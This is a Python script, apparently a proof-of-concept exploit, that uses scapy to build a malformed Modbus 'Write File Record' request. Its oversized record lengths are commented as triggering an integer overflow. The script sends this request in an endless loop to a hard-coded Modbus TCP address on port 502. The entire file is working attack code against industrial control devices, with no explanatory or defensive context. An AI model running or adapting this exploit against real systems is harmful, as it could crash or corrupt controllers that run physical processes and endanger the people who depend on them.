from scapy.all import *
load_contrib('modbus')
import time
import socket
import struct

def create_exploit_packet():
    # Modbus Write File Record header
    function_code = 0x15
    reference_type_1 = 0x06
    file_number_1 = 0x0001
    record_number_1 = 0x0000
    record_length_1 = 0xfffe  # Trigger integer overflow

    # Second group (malicious)
    reference_type_2 = 0x06
    file_number_2 = 0x0002
    record_number_2 = 0x0000
    record_length_2 = 0xfffb  # Cause bytes_processed to become 0

    # Construct payload
    payload = struct.pack('>B', function_code)
    payload += struct.pack('>BHHHH',
                           reference_type_1,
                           file_number_1,
                           record_number_1,
                           record_length_1)
    payload += b'\x00\x00'  # Minimum 2 bytes of data for the first group
    
    payload += struct.pack('>BHHHH',
                           reference_type_2,
                           file_number_2,
                           record_number_2,
                           record_length_2)
    payload += b'\x00\x00'  # Minimum 2 bytes of data for the second group

    return payload

exploit_packet = create_exploit_packet()

# Create a socket and connect
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.103.152.8", 502))   # IP and port
ss = StreamSocket(s, Raw)

try:
    while True:
        # Create Modbus TCP ADU with the exploit payload
        transaction_id = 1
        protocol_id = 0
        unit_id = 1
        length = len(exploit_packet) + 1  # +1 for the Unit Identifier
        
        modbus_tcp = struct.pack('>HHHB', transaction_id, protocol_id, length, unit_id) + exploit_packet
        
        # Send the packet and receive response
        ss.send(Raw(modbus_tcp))
        response = ss.recv()
        
        if response:
            print("Response received:")
            response.show()
        else:
            print("No response received")
        
        time.sleep(1)
except KeyboardInterrupt:
    print("Stopped by user")
except Exception as e:
    print(f"Error: {e}")
finally:
    s.close()
    print("Connection closed")
